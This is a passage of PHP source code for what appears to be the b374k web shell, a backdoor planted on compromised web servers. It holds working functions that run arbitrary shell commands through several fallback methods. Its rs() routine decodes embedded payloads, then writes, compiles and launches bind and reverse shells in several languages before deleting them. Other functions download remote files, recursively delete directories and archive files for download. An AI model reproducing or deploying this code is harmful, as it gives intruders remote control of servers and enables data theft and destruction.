VfsxGAyGd8d8Y6OgUkrJdh8JBIIRjPFOY1NV7adAINgRCATeOKC8vejSpZfs5pa8+0MAUGSM7RmnlmXlZ2d/m7AsKw8AIEmSMjHx3KwkSUpTovEA4D8gwQkPAJXGpf2mZQAh1JzBpOlXGCHUjhCSW+zOFWzbdg6eEGzbXseVSnnxSRGoVMqLWNfNm42BctIghmHcxJqWu0UpOfEwUErVfF6bwYWCmdZ1Y/qkCei6Pm0YRhoTQkgqtfoVpdR0vGMhwKIoKZIkRSRJioiipCDkfJRTSo1UavVLQgjhG2wW83nt20gk+o6TnUAQxNDY2PgMY4w2yhILghByat80jW8Mw0jubESMMVaplJORSHRcEIQzDiYZ4jjOw/O8l+d5L8dxHtTcLPbB5mb9z0Ri4a16vV7ZsxNallWtVqt/xWKxixjj0GNJe0LuLSzMTxmGfv8/t+JarapubW3Ny7Ly7HGTsG373srK8lQ2u3Zn37UcAKBYLP5tWZtzPp9vUBDEM8egDWi1Wp1bXExMZbNrdw4UJrtIqLmcel0UJdvj8Z7HGLmPVuvEWFtb+zyRWHh7Y6Nw/yjilJNlpSFO5RcwxjGH4nRd1/VfdolTciR13CTPu8Lh8POyLE96vafiPM9HAWB7kS3btp2rVMpJ0zRvqKp6yzSNjBN5/g/C3ULDeIdIrQAAAABJRU5ErkJggg==";
$s_dark_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAASdJREFUeNrsk0GKwjAYhZNJqYviQpDKLOcY3sOFIF5DFF0KgjeYAwizmDuNOxHcFrGlje9pA1KbNOqshvnh2YD58v6m75dxHIdCiAk0gt5Fc+2gDbQO8DNTSk1D1BtKSikoWxVF0U7TdJ5lmSI8BtfCARKsoFyw1poeLcBjwl0aEgqCwAma4n5yhC+AceSzqdD69RAD+zjedSBeqH/4CfiA74bgaG+o3HxQURR1sOgjnqpMDv+0ikZJkpzyPP9kwlbIaQgNsO55GO+hb2hp3vnI1Hl2XZT7xe+PJNbWYWgcyao7L+p22h4ayephdyPJVl3v+jFcuhNmg+tAazxvN9tA86m83H6+Fm5n3mpd49sSlDaYN3jJb8WFazMy2rftujb/yEieBRgAZHG/OeGef6MAAAAASUVORK5CYII=";
$s_bright_cb = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAeCAYAAADzXER0AAAACXBIWXMAAAsSAAALEgHS3X78AAABP0lEQVQ4je2TsUoDQRCGv5m93RRBLBIQO/NOFgHJa4iiZUDwNUSx8J0s5SCFkkJy3M5aJBfwLrm7oI3gD8sWO9/+O+z8kud5AC6BC+CUbr0Bj8B9BlzHGK+KoghmpiklUkp7SVU9CiHceO9dBsyKohjEGMXMMLNWWETUzAbe+1kGjM1MzIyyLFvBSmYmwDgDSCltHc2sE1bV9V7BfRwblxxM/MM/gxeqmkSkNyQiCVgo8BBCWDnnkoigqq3LOZeGw+EKeMqAO+998N6fAyc9jHPgBZhXPX8C3XO5lm3q+f1Ixhh3QUCPSNbdReRb2g6KZP2yRiRjjK29vj7fNlupO/QFG/Cu4n0grL+ql9tkOm93FhF2PfxsA9bPtrCqIiJIzWUynVNFph4dyfP8fblcHpdlSTUkXVJVRqPRxx+N5BfD5OFvXtL9jAAAAABJRU5ErkJggg==";
$s_style = "rVbLjpswFP0VqqhSH4AgSTMzoH5Cl11VXRgwwRqwkTGdZBD/Xj/BgJNppbE3Drm+z3PP9ZehJJgFJWhQfU1+Zj1mvfeDYOJ3kKIyHTNSXIcM5M9nSnpcJLtIrlRe69ArTOJ9e0lzUhOa7Eq51J8vEJ0rlhy58FjRISO0gDSJ24vXkRoV3m4vVzqCwdw+y0PK4IUFBcwJBQwRnGCCIRdLKvIH0mFpamwpHFpQFAifk8h75L6MJaHNUKCurcE1QbhG4joDWQ09VvntkPe04yoKWIK+Zum4awDCiyBjudKgIa+BcjygoEB9l8QRt+D49IIKVvFj9DE13vC8KH92FQRcfpBxgRqdcVLDkqUNoGeEk2i6EU2yHiuGe39X8TBXYC8c4PnOnhELGAW4ExlIKGGAwU9BfAgPDwU8f1bx3BO4b9IDfggvLU8/rFHHVD08sK7IroG4d6XTaPdEZo4yMxR2vATDfyR6iyMDG1HnoFKoi09CdOuCdhXINTukgGOCPprChSJ0hEui0RuIsrlMa0UnS4mIUSiWnihNLKs7j9FB+7gXKeAZZCgHtcZFg4qi5mgNz+DKs23jXZuye+tB9JYUepfq15AxHmTXglxHwLWLYjZoUc79k9jpv3StQ+WKOd7Fcwd+jhv4iC8bgM+1VoFqkrHDPZzEvu3oW37O/48hwm3PXv2wpaRpmR+yCwMUAle3aKBHJoqMMEYaG32HJ7HvU7EFR25emR22GDJ+WDSmUXp4iORV5XnWs2Flb+H6k9hrZNyk/qn/JBkYbhkcXCrKFM0inHTcQ2IS4Px5M2/aus0Xrl5kpE1Xk2VWX22SuOgQZcHcPk0gm+5TB9DiR7E/oKYllAHMJ1PYwYbP5CuaxpkM00XToeApT045O4HLFjjdJVCtVuXaqH7U1RfKK5/HvfXYwUlK/u0aaMlqbw/HHGJOGjauv61xlou9ZpfTpuWtL1sXXGEv5kAczbFPUy6XS9Augi8lcmb7ZrjWwFGQN0r+JVeOxNvotQfPUnnOE8lTOj2T4ngmvWtGLu8zfm+n8bg0J6p9M9ajXGsG2QLeMx2JCUPlApTmktahH6xbYKxRq40cFvDXvnv72diMBa16DEtC2PKBR4VaG8IieY5pqDWtCGP9bPBV5vjJRtsoOfkXu7bwe17B/JmL/A7zrgvML++rV4MM1vKjPBkQqKeMfDmaJ5NosuWrOchqkj8vH1bLVgwobCFgnJb0yf6vJR2S3MyrdeOho5/iLUGy5d+OKJEHWDgic1sOpMeqi33NNrE5UP9Ng0vmHf8C";
$s_mime_types = "dZThdqMgEIX/7zn7DvMC2jZ62t3HmQgaGkepCDFvvxeNis32xx3huwMYmUkwSvcvRWMtIfz+Fbb5CeC0gsvp/Y1iSEARQZGAMoJyBZ9WN/Rpm7ADoUWNrEw+T7TIbmeJLemhgNCUu4EdH2EekLwh47Sd0DcN9fuBX95U19GIpq+RpN946FSudKXziyIfLlC4PHnSn02r4Un05cm3ca2Nnn3yXPRc9NyTN0+jFXV8pXDO63gmBimvw0hQiuJH8ENLMnmS0h8sl9mW74Nmdc9FK8O5vQeC0iyc7fP4kX3w8UUOWwQTekJY2U2fhWJYwZTVuBooAa0hKAXIaJMMibeZLhEeh95dmeQK51ooBJfYHe64axLgMnY1LZoOPPRngg7shneWbyQAhW9sAjvudgtg4cCWW+OQ/EDXmAxFZTTNMTFwjIvHsFemf2FlKyHEFZzZmYrYk+vUysQoQwg0D6480CBmM5dm4H2+tAC+HLoUioMCjYBnsWUtzcAUn85OK3aFELRNTXslhHW+1ek8RWlwLA8+2KYxI7fZzXTKke6Pawcm6IBGR9A3FJsPj4tKeesr3Y156E2lqQ029f5b2IzCPhzWeT1wjh/Q2vLP6yttox+SPsqPR1Ic/ZD0933dKY7SpMFYgla0dsr2SlPGjLvmKgGmRgGbWXNIvIprgnZQt1gew46StkmO2f4RCp9A1DKjlnk6MmHUfLLYdhk+a7tc+cBCww8mbsA3pkNx2j3hxmgr3up9EprkHw==";
// http://www.kryogenix.org/code/browser/sorttable/ - SortTable (c) Stuart Langridge
$s_sortable_js = "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";
// https://github.com/ded/domready - domready (c) Dustin Diaz
$s_domready_js = "VVJNb9swDP0riQ6GBAjOetglheBD19uGHrpbkAKaRFcqZMmQ6HSB5/8+2mm+Lpb5yPf4SGndDtGgT5GDRDHisYfUrrpkhwBrxYZoofURLGtOWA1/+5SxKORi+1V9KlGKnbVYVd2lat1ZSqc/H2CQNSeQIwk4X3awn8UmzmzqMmh7ZPJqSozn/1U/R049PH46H4CDwro43xJXAPEPOq9Q7fYyyqzWD9Irm8zQQURZlK/PwXOABUuqEPZqcgpBDor9ePn1lCJS6mfSlgaWWjFt7fNhhnyhDGRyRmPExWVBjWCcju/AZFBsAV9nkEmjUrN5C4vQvzez2V4Cs5FOmRqhIPe7sBePGXDIceV3el9V85cPMqrLBsTo6wxdOsCdk7lIZiF7mnw+E3FrjaiNW+p4ey+yIRc3XauK00rgrnwRE5OQQO4v1CjGAqFdK0x945o4X3vdD8VRZnvTAPNxvG6UswAtMjEZjcbRVY9fYxbA376DNFDLKxlIbJLfv4kpzi9BTNvbF+AauHYFMU3iPw==";

// magic quote and shit :-p
function clean($arr){
	$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));
	if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){
		foreach($arr as $k=>$v){
			$arr[$k] = (empty($quotes_sybase) || $quotes_sybase === 'off')? stripslashes($v) : stripslashes(str_replace("\'\'", "\'", $v));
		}
	}
	return $arr;
}
// addslashes if on windows
function adds($s_s){
	global $s_win;
	return ($s_win)? addslashes($s_s):$s_s;
}
// add slash to the end of given path
function cp($s_p){
	global $s_win;
	if(@is_dir($s_p)){
		$s_x = DS;
		while(substr($s_p, -1) == $s_x) $s_p = rtrim($s_p, $s_x);
		return ($s_win)? preg_replace("/\\\\+/is", "\\", $s_p.$s_x):$s_p.$s_x;
	}
	return $s_p;
}
// make link for folder $s_cwd and all of its parent folder
function swd($s_p){
	global $s_self;
	$s_ps = explode(DS,$s_p);
	$s_pu = "";
	for($s_i = 0; $s_i < sizeof($s_ps)-1; $s_i++){
		$s_pz = "";
		for($s_j = 0; $s_j <= $s_i; $s_j++) $s_pz .= $s_ps[$s_j].DS;
		$s_pu .= "<a href='".$s_self."cd=".$s_pz."'>".$s_ps[$s_i]." ".DS." </a>";
	}
	return trim($s_pu);
}
// htmlspecialchars
function hss($s_t){
	return htmlspecialchars($s_t, 8);
}
// add quotes
function pf($f){
	return "\"".$f."\"";
}
// replace spaces with underscore ( _ )
function cs($s_t){
	return str_replace(" ", "_", $s_t);
}
// trim and urldecode
function ss($s_t){
	return rawurldecode($s_t);
}
// return tag html for notif
function notif($s){
	return "<div class='notif'>".$s."</div>";
}
// bind and reverse shell
function rs($s_rstype,$s_rstarget,$s_rscode){
	// resources $s_rs_pl $s_rs_py $s_rs_rb $s_rs_js $s_rs_c $s_rs_java $s_rs_java $s_rs_win $s_rs_php
	$s_result = $s_fpath = "";
	$s_fc = gzinflate(base64_decode($s_rscode));

	$s_errperm = "Directory ".getcwd().DS." is not writable, please change to a writable one";
	$s_errgcc = "Unable to compile using gcc";
	$s_errjavac = "Unable to compile using javac";

	$s_split = explode("_", $s_rstype);
	$s_method = $s_split[0];
	$s_lang = $s_split[1];
	if($s_lang=="py" || $s_lang=="pl" || $s_lang=="rb" || $s_lang=="js"){
		if($s_lang=="py") $s_runlang = "python";
		elseif($s_lang=="pl") $s_runlang = "perl";
		elseif($s_lang=="rb") $s_runlang = "ruby";
		elseif($s_lang=="js") $s_runlang = "node";
		$s_fpath = "b374k_rs.".$s_lang;
		if(@is_file($s_fpath)) unlink($s_fpath);
		if($s_file = fopen($s_fpath, "w")){
			fwrite($s_file, $s_fc);
			fclose($s_file);
			if(@is_file($s_fpath)){
				$s_result = exe("chmod +x ".$s_fpath);
				$s_result = exe($s_runlang." ".$s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="c"){
		$s_fpath = "b374k_rs";
		if(@is_file($s_fpath)) unlink($s_fpath);
		if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
		if($s_file = fopen($s_fpath.".c", "w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath.".c")){
				$s_result = exe("gcc ".$s_fpath.".c -o ".$s_fpath);
				if(@is_file($s_fpath)){
					$s_result = exe("chmod +x ".$s_fpath);
					$s_result = exe("./".$s_fpath." ".$s_rstarget);
				}
				else $s_result = $s_errgcc;
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="win"){
		$s_fpath = "b374k_rs.exe";
		if(@is_file($s_fpath)) unlink($s_fpath);
		if($s_file = fopen($s_fpath,"w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath)){
				$s_result = exe($s_fpath." ".$s_rstarget);
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="java"){
		$s_fpath = "b374k_rs";
		if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
		if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
		if($s_file = fopen($s_fpath.".java", "w")){
			fwrite($s_file,$s_fc);
			fclose($s_file);
			if(@is_file($s_fpath.".java")){
				$s_result = exe("javac ".$s_fpath.".java");
				if(@is_file($s_fpath.".class")){
					$s_result = exe("java ".$s_fpath." ".$s_rstarget);
				}
				else $s_result = $s_errjavac;
			}
			else $s_result = $s_errperm;
		}
		else $s_result = $s_errperm;
	}
	elseif($s_lang=="php"){
		$s_result = eval("?>".$s_fc);
	}

	if(@is_file($s_fpath)) unlink($s_fpath);
	if(@is_file($s_fpath.".c")) unlink($s_fpath.".c");
	if(@is_file($s_fpath.".java")) unlink($s_fpath.".java");
	if(@is_file($s_fpath.".class")) unlink($s_fpath.".class");
	if(@is_file($s_fpath."\$pt.class")) unlink($s_fpath."\$pt.class");

	return $s_result;
}
function geol($str){
	$nl = PHP_EOL;
	if(preg_match("/\r\n/", $str, $r)) $nl = "\r\n";
	else{
		if(preg_match("/\n/", $str, $r)) $nl = "\n";
		elseif(preg_match("/\r/", $str, $r)) $nl = "\r";
	}
	return bin2hex($nl);
}
// format bit
function ts($s_s){
	if($s_s<=0) return 0;
	$s_w = array('B','KB','MB','GB','TB','PB','EB','ZB','YB');
	$s_e = floor(log($s_s)/log(1024));
	return sprintf('%.2f '.$s_w[$s_e], ($s_s/pow(1024, floor($s_e))));
}
// get file size
function gs($s_f){
	$s_s = @filesize($s_f);
	if($s_s !== false){
		if($s_s<=0) return 0;
		return ts($s_s);
	}
	else return "???";
}
// get file permissions
function gp($s_f){
	if($s_m = @fileperms($s_f)){
		$s_p = 'u';
		if(($s_m & 0xC000) == 0xC000)$s_p = 's';
		elseif(($s_m & 0xA000) == 0xA000)$s_p = 'l';
		elseif(($s_m & 0x8000) == 0x8000)$s_p = '-';
		elseif(($s_m & 0x6000) == 0x6000)$s_p = 'b';
		elseif(($s_m & 0x4000) == 0x4000)$s_p = 'd';
		elseif(($s_m & 0x2000) == 0x2000)$s_p = 'c';
		elseif(($s_m & 0x1000) == 0x1000)$s_p = 'p';
		$s_p .= ($s_m & 00400)? 'r':'-';
		$s_p .= ($s_m & 00200)? 'w':'-';
		$s_p .= ($s_m & 00100)? 'x':'-';
		$s_p .= ($s_m & 00040)? 'r':'-';
		$s_p .= ($s_m & 00020)? 'w':'-';
		$s_p .= ($s_m & 00010)? 'x':'-';
		$s_p .= ($s_m & 00004)? 'r':'-';
		$s_p .= ($s_m & 00002)? 'w':'-';
		$s_p .= ($s_m & 00001)? 'x':'-';
		return $s_p;
	}
	else return "???????????";
}
// shell command
function exe($s_c){
	$s_out = "";
	$s_c = $s_c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('shell_exec')){
		$s_out = @shell_exec($s_c);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('exec')) {
		@exec($s_c,$s_r);
		if(!empty($s_r)) foreach($s_r as $s_s) $s_out .= $s_s;
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($s_c);
		$s_out = ob_get_contents();
		ob_end_clean();
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('proc_open')) {
		$s_descriptorspec = array(
			0 => array("pipe", "r"),
			1 => array("pipe", "w"),
			2 => array("pipe", "w"));
		$s_proc = @proc_open($s_c, $s_descriptorspec, $s_pipes, getcwd(), array());
		if (is_resource($s_proc)) {
			while($s_si = fgets($s_pipes[1])) {
				if(!empty($s_si)) $s_out .= $s_si;
			}
			while($s_se = fgets($s_pipes[2])) {
				if(!empty($s_se)) $s_out .= $s_se;
			}
		}
		@proc_close($s_proc);
		if(!empty($s_out)) return $s_out;
	}
	if(is_callable('popen')){
		$s_f = @popen($s_c, 'r');
		if($s_f){
			while(!feof($s_f)){
				$s_out .= fread($s_f, 2096);
			}
			pclose($s_f);
		}
		if(!empty($s_out)) return $s_out;
	}
	return "";
}
// delete dir and all of its content (no warning !) xp
function rmdirs($s){
	$s = (substr($s,-1)=='/')? $s:$s.'/';
	if($dh = opendir($s)){
		while(($f = readdir($dh))!==false){
			if(($f!='.')&&($f!='..')){
				$f = $s.$f;
				if(@is_dir($f)) rmdirs($f);
				else @unlink($f);
			}
		}
		closedir($dh);
		@rmdir($s);
	}
}
function copys($s,$d,$c=0){
	if($dh = opendir($s)){
		if(!@is_dir($d)) @mkdir($d);
		while(($f = readdir($dh))!==false){
			if(($f!='.')&&($f!='..')){
				if(@is_dir($s.DS.$f)) copys($s.DS.$f,$d.DS.$f);
				else copy($s.DS.$f,$d.DS.$f);
			}
		}
		closedir($dh);
	}
}
// get array of all files from given directory
function getallfiles($s_dir){
    $s_f = glob($s_dir.'*');
	for($s_i = 0; $s_i<count($s_f); $s_i++){
		if(@is_dir($s_f[$s_i])){
			$s_a = glob($s_f[$s_i].DS.'*');
			if(is_array($s_f) && is_array($s_a)) $s_f = array_merge($s_f, $s_a);
		}
	}
    return $s_f;
}
// download file from internet
function dlfile($s_u,$s_p){
	global $s_wget, $s_lwpdownload, $s_lynx, $s_curl;

	if(!preg_match("/[a-z]+:\/\/.+/",$s_u)) return false;
	$s_n = basename($s_u);

	// try using php functions
	if($s_t = @file_get_contents($s_u)){

		if(@is_file($s_p)) unlink($s_p);
		if($s_f = fopen($s_p,"w")){
			fwrite($s_f, $s_t);
			fclose($s_f);
			if(@is_file($s_p)) return true;
		}
	}
	// using wget
	if($s_wget){
		$buff = exe("wget ".$s_u." -O ".$s_p);
		if(@is_file($s_p)) return true;
	}
	// try using curl
	if($s_curl){
		$buff = exe("curl ".$s_u." -o ".$s_p);
		if(@is_file($s_p)) return true;
	}
	// try using lynx
	if($s_lynx){
		$buff = exe("lynx -source ".$s_u." > ".$s_p);
		if(@is_file($s_p)) return true;
	}
	// try using lwp-download
	if($s_lwpdownload){
		$buff = exe("lwp-download ".$s_u." ".$s_p);
		if(@is_file($s_p)) return true;
	}
	return false;
}
// find writable dir
function get_writabledir(){
	if(!$s_d = getenv("TEMP")) if(!$s_d = getenv("TMP")) if(!$s_d = getenv("TMPDIR")){
		if(@is_writable("/tmp")) $s_d = "/tmp/";
		else if(@is_writable(".")) $s_d = ".".DS;
	}
	return cp($s_d);
}
// zip function
function zip($s_srcarr, $s_dest){
	if(!extension_loaded('zip')) return false;
	if(class_exists("ZipArchive")){
		$s_zip = new ZipArchive();
		if(!$s_zip->open($s_dest, 1)) return false;

		if(!is_array($s_srcarr)) $s_srcarr = array($s_srcarr);
		foreach($s_srcarr as $s_src){
			$s_src = str_replace('\\', '/', $s_src);
			if(@is_dir($s_src)){
				$s_files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($s_src), 1);
				foreach($s_files as $s_file){
					$s_file = str_replace('\\', '/', $s_file);
					if(in_array(substr($s_file, strrpos($s_file, '/')+1), array('.', '..'))) continue;
					if (@is_dir($s_file)===true)	$s_zip->addEmptyDir(str_replace($s_src.'/', '', $s_file.'/'));
					else if (@is_file($s_file)===true) $s_zip->addFromString(str_replace($s_src.'/', '', $s_file), @file_get_contents($s_file));
				}
			}
			elseif(@is_file($s_src) === true) $s_zip->addFromString(basename($s_src), @file_get_contents($s_src));
		}
		$s_zip->close();
		return true;
	}
}
// check shell permission to access program
function check_access($s_lang){
	$s_s = false;
	$ver = "";
	switch($s_lang){
		case "python":
			$s_cek = strtolower(exe("python -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("python -V");
			break;
		case "perl":
			$s_cek = strtolower(exe("perl -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("perl -e \"print \$]\"");
			break;
		case "ruby":
			$s_cek = strtolower(exe("ruby -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("ruby -v");
			break;
		case "node":
			$s_cek = strtolower(exe("node -h"));
			if(strpos($s_cek,"usage")!==false) $ver = exe("node -v");
			break;
		case "gcc":
			$s_cek = strtolower(exe("gcc --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("gcc --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)>0) $ver = $s_ver[0];
			}
			break;
		case "tar":
			$s_cek = strtolower(exe("tar --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("tar --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)>0) $ver = $s_ver[0];
			}
			break;
		case "java":
			$s_cek = strtolower(exe("javac --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_cek = strtolower(exe("java -h"));
				if(strpos($s_cek,"usage")!==false) $ver = str_replace("\n", ", ", exe("java -version"));
			}
			break;
		case "wget":
			$s_cek = strtolower(exe("wget --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("wget --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)>0) $ver = $s_ver[0];
			}
			break;
		case "lwpdownload":
			$s_cek = strtolower(exe("lwp-download --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("lwp-download --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)>0) $ver = $s_ver[0];
			}
			break;
		case "lynx":
			$s_cek = strtolower(exe("lynx --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("lynx -version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)>0) $ver = $s_ver[0];
			}
			break;
		case "curl":
			$s_cek = strtolower(exe("curl --help"));
			if(strpos($s_cek,"usage")!==false){
				$s_ver = exe("curl --version");
				$s_ver = explode("\n",$s_ver);
				if(count($s_ver)>0) $ver = $s_ver[0];
			}
			break;
		default:
			return false;
	}
	if(!empty($ver)) $s_s = $ver;
	return $s_s;
}
// find available archiver
function get_archiver_available(){
	global $s_self, $s_tar;

	$s_dlfile = "";
	$s_avail_arc = array("raw" => "raw");

	if(class_exists("ZipArchive")) $s_avail_arc["ziparchive"] = "zip";
	if($s_tar){
		$s_avail_arc["tar"] = "tar";
		$s_avail_arc["targz"] = "tar.gz";
	}

	$s_option_arc = "";
	foreach($s_avail_arc as $s_t=>$s_u) $s_option_arc .= "<option value=\"".$s_t."\">".$s_u."</option>";

	$s_dlfile .= "<form action='".$s_self."' method='post'>
				<select onchange='download(this);' name='dltype' class='inputzbut' style='width:80px;height:20px;'>
				<option value='' disabled selected>Download</option>
				".$s_option_arc."
				</select>
				<input type='hidden' name='dlpath' value='__dlpath__' />
				</form>";
	return $s_dlfile;
}
// explorer, return a table of given dir
function showdir($s_cwd){
	global $s_self, $s_win, $s_posix, $s_tar;

	$s_fname = $s_dname = array();
	$s_total_file = $s_total_dir = 0;

	if($s_dh = @opendir($s_cwd)){
		while($s_file = @readdir($s_dh)){
			if(@is_dir($s_file)) $s_dname[] = $s_file;
			elseif(@is_file($s_file))$s_fname[] = $s_file;
		}
		closedir($s_dh);
	}

	natcasesort($s_fname);
	natcasesort($s_dname);
	$s_list = array_merge($s_dname,$s_fname);

	if($s_win){
		//check if this root directory
		chdir("..");
		if(cp(getcwd())==cp($s_cwd)) array_unshift($s_list, ".");
		chdir($s_cwd);
	}

	$s_path = explode(DS,$s_cwd);
	$s_tree = sizeof($s_path);

	$s_parent = "";
	if($s_tree > 2) for($s_i = 0; $s_i<$s_tree-2; $s_i++) $s_parent .= $s_path[$s_i].DS;
	else $s_parent = $s_cwd;

	$s_owner_html = (!$s_win && $s_posix)? "<th style='width:140px;min-width:140px;'>owner:group</th>":"";
	$s_colspan = (!$s_win && $s_posix)? "5" : "4";
	$s_buff = "
	<table class='explore sortable'><thead>
